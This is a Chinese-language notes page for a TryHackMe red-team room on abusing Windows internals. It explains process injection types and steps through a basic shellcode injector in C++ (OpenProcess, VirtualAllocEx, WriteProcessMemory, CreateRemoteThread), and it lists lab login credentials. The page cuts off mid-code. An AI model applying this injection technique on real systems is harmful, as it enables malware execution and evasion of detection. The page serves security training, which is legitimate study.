<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Abusing Windows Internals - 滥用 Windows 内部机制 | PgDn&#x27;s Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://pgup-code.github.io/PgUp-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://pgup-code.github.io/PgUp-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Abusing Windows Internals - 滥用 Windows 内部机制 | PgDn&#x27;s Notes"><meta data-rh="true" name="description" content="通过运用与工具无关的现代方法，利用Windows内部组件规避常见检测方案"><meta data-rh="true" property="og:description" content="通过运用与工具无关的现代方法，利用Windows内部组件规避常见检测方案"><link data-rh="true" rel="icon" href="/PgUp-code.github.io/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制" hreflang="en"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/PgUp-code.github.io/blog/rss.xml" title="PgDn&#39;s Notes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/PgUp-code.github.io/blog/atom.xml" title="PgDn&#39;s Notes Atom Feed"><link rel="stylesheet" href="/PgUp-code.github.io/assets/css/styles.ebd0f903.css">
<script src="/PgUp-code.github.io/assets/js/runtime~main.005fc784.js" defer="defer"></script>
<script src="/PgUp-code.github.io/assets/js/main.770912a1.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/PgUp-code.github.io/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/PgUp-code.github.io/"><div class="navbar__logo"><img src="/PgUp-code.github.io/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/PgUp-code.github.io/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">PgDn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/PgUp-code.github.io/docs/category/red-teaming---红队">TryHackMe</a><a class="navbar__item navbar__link" href="/PgUp-code.github.io/docs/category/docusaurus-备忘录">备忘录</a><a class="navbar__item navbar__link" href="/PgUp-code.github.io/blog">博客</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/PgUp-code/PgUp-code.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/PgUp-code.github.io/docs/category/red-teaming---红队">Red Teaming - 红队</a><button aria-label="Collapse sidebar category &#x27;Red Teaming - 红队&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/PgUp-code.github.io/docs/category/host-evasions---主机规避">Host Evasions - 主机规避</a><button aria-label="Collapse sidebar category &#x27;Host Evasions - 主机规避&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Windows Internals - Windows 内部原理">Windows Internals - Windows 内部原理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Windows API - Windows API简介">Introduction to Windows API - Windows API简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制">Abusing Windows Internals - 滥用 Windows 内部机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介">Introduction to Antivirus - 防病毒简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode">AV Evasion Shellcode - AV 绕过：Shellcode</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则">Obfuscation Principles - 混淆原则</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避">Signature Evasion - 签名规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC">Bypassing UAC - 绕过 UAC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避">Runtime Detection Evasion - 运行时检测规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控">Evading Logging and Monitoring - 绕过日志记录和监控</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具">Living Off the Land - 利用现成工具</a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/PgUp-code.github.io/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/PgUp-code.github.io/docs/category/red-teaming---红队"><span itemprop="name">Red Teaming - 红队</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/PgUp-code.github.io/docs/category/host-evasions---主机规避"><span itemprop="name">Host Evasions - 主机规避</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Abusing Windows Internals - 滥用 Windows 内部机制</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Abusing Windows Internals - 滥用 Windows 内部机制</h1></header><blockquote>
<p>通过运用与工具无关的现代方法，利用Windows内部组件规避常见检测方案</p>
<p><a href="https://tryhackme.com/room/abusingwindowsinternals" target="_blank" rel="noopener noreferrer">TryHackMe | Abusing Windows Internals</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction---简介">Introduction - 简介<a href="#introduction---简介" class="hash-link" aria-label="Direct link to Introduction - 简介" title="Direct link to Introduction - 简介">​</a></h2>
<p>Windows内部机制是操作系统功能的核心架构，这为攻击者实施恶意行为提供了有利可图的目标。通过利用Windows内部机制，攻击者可实现代码隐藏与执行、检测规避，并与其他技术或漏洞进行链式利用。</p>
<p>&quot;Windows内部机制&quot;这一术语涵盖Windows操作系统后端的所有组件，包括进程、文件格式、COM（组件对象模型）、任务调度、I/O系统等。本实验将重点研究如何滥用进程及其组件、DLL（动态链接库）和PE（可移植可执行）格式。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="Direct link to 学习目标" title="Direct link to 学习目标">​</a></h3>
<ul>
<li>理解内部组件为何存在漏洞</li>
<li>掌握滥用和利用Windows内部机制漏洞的方法</li>
<li>了解相关缓解措施与检测技术</li>
<li>将所学技术应用于真实攻击案例分析</li>
</ul>
<p>开始本实验前，请确保具备Windows系统基础操作知识。建议先行完成<a href="https://tryhackme.com/room/windowsinternals" target="_blank" rel="noopener noreferrer">Windows内部机制实验</a>。具备C++和PowerShell基础编程知识更佳，但非强制要求。</p>
<p>我们已提供预配置的Windows实验环境，包含完成本实验所需的文件。您可通过浏览器直接访问或使用以下凭证通过RDP连接：</p>
<p>机器IP: <code>10.10.89.76</code>
用户名: <code>THM-Attacker</code>
密码: <code>Tryhackme!</code></p>
<p>请注意，本实验信息密度较高。请系好安全带，并确认最近的灭火器位置。</p>
<p>离场时请记得给蓝队留下小费！</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="abusing-processes---滥用进程机制">Abusing Processes - 滥用进程机制<a href="#abusing-processes---滥用进程机制" class="hash-link" aria-label="Direct link to Abusing Processes - 滥用进程机制" title="Direct link to Abusing Processes - 滥用进程机制">​</a></h2>
<p>操作系统上运行的应用程序可包含一个或多个进程。进程负责维护并代表正在执行的程序。</p>
<p>进程包含众多子组件，且直接与内存或虚拟内存交互，因而成为理想的攻击目标。下表描述了进程的关键组件及其功能：</p>
<table><thead><tr><th style="text-align:left"><strong>进程组件</strong></th><th style="text-align:left"><strong>功能</strong></th></tr></thead><tbody><tr><td style="text-align:left">私有虚拟地址空间</td><td style="text-align:left">进程分配的虚拟内存地址</td></tr><tr><td style="text-align:left">可执行程序</td><td style="text-align:left">定义虚拟地址空间中存储的代码与数据</td></tr><tr><td style="text-align:left">开放句柄</td><td style="text-align:left">定义进程可访问的系统资源句柄</td></tr><tr><td style="text-align:left">安全上下文</td><td style="text-align:left">访问令牌定义用户、安全组、权限等安全信息</td></tr><tr><td style="text-align:left">进程标识符</td><td style="text-align:left">进程的唯一数字标识</td></tr><tr><td style="text-align:left">线程</td><td style="text-align:left">进程中计划执行的任务单元</td></tr></tbody></table>
<p>如需深入了解进程机制，请参阅<a href="https://tryhackme.com/room/windowsinternals" target="_blank" rel="noopener noreferrer">Windows内部机制实验</a>。</p>
<p>进程注入通常作为统称术语，描述通过合法功能或组件向进程注入恶意代码的行为。本实验将重点讲解四种注入类型：</p>
<table><thead><tr><th style="text-align:left"><strong>注入类型</strong></th><th style="text-align:left"><strong>功能</strong></th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://attack.mitre.org/techniques/T1055/012/" target="_blank" rel="noopener noreferrer">进程镂空</a></td><td style="text-align:left">向挂起且&quot;镂空&quot;的目标进程注入代码</td></tr><tr><td style="text-align:left"><a href="https://attack.mitre.org/techniques/T1055/003/" target="_blank" rel="noopener noreferrer">线程执行劫持</a></td><td style="text-align:left">向挂起的目标线程注入代码</td></tr><tr><td style="text-align:left"><a href="https://attack.mitre.org/techniques/T1055/001/" target="_blank" rel="noopener noreferrer">动态链接库注入</a></td><td style="text-align:left">向进程内存注入DLL</td></tr><tr><td style="text-align:left"><a href="https://attack.mitre.org/techniques/T1055/002/" target="_blank" rel="noopener noreferrer">可移植可执行文件注入</a></td><td style="text-align:left">将指向恶意函数的PE镜像自注入目标进程</td></tr></tbody></table>
<p><a href="https://attack.mitre.org/techniques/T1055/" target="_blank" rel="noopener noreferrer">MITRE T1055</a>列举了更多进程注入形式。</p>
<p>基础层级的进程注入表现为shellcode注入。其高阶实现可分为四个步骤：</p>
<ol>
<li>以完全访问权限打开目标进程</li>
<li>为shellcode分配目标进程内存</li>
<li>将shellcode写入目标进程内存</li>
<li>通过远程线程执行shellcode</li>
</ol>
<p>下图展示了Windows API调用与进程内存的交互过程：</p>
<p><img decoding="async" loading="lazy" alt="img" src="/PgUp-code.github.io/assets/images/ba04c5ef220c10b3e174bd1ca77959c6-1741657718173-7-1741657722137-10-ad930fe6bdf768c80bab837178341883.png" width="841" height="301" class="img_ev3q"></p>
<p>以下通过基础shellcode注入程序解析各步骤：</p>
<p><strong>第一步</strong>：使用命令行参数指定的目标进程，通过<code>OpenProcess</code>开启进程访问：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">processHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">OpenProcess</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PROCESS_ALL_ACCESS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// 定义访问权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    FALSE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">               </span><span class="token comment" style="color:#999988;font-style:italic">// 目标句柄不可继承</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">DWORD</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">atoi</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 命令行参数提供的本地进程ID</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><strong>第二步</strong>：通过<code>VirtualAllocEx</code>分配与shellcode字节大小匹配的内存空间，其中<code>dwSize</code>参数使用<code>sizeof</code>函数计算shellcode字节数：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">remoteBuffer </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAllocEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    processHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic">// 已开启的目标进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic">// 内存分配区域大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">MEM_RESERVE </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 保留并提交内存页</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PAGE_EXECUTE_READWRITE      </span><span class="token comment" style="color:#999988;font-style:italic">// 授予执行及读写权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><strong>第三步</strong>：使用<code>WriteProcessMemory</code>将shellcode写入已分配内存区域：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">WriteProcessMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    processHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// 已开启的目标进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    remoteBuffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic">// 分配的内存区域</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic">// 待写入数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token comment" style="color:#999988;font-style:italic">// 数据字节大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><strong>第四步</strong>：通过<code>CreateRemoteThread</code>执行内存中的shellcode，线程控制进程执行流：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">remoteThread </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateRemoteThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    processHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// 已开启的目标进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic">// 默认栈大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPTHREAD_START_ROUTINE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">remoteBuffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 线程起始地址指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">              </span><span class="token comment" style="color:#999988;font-style:italic">// 创建后立即执行</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" 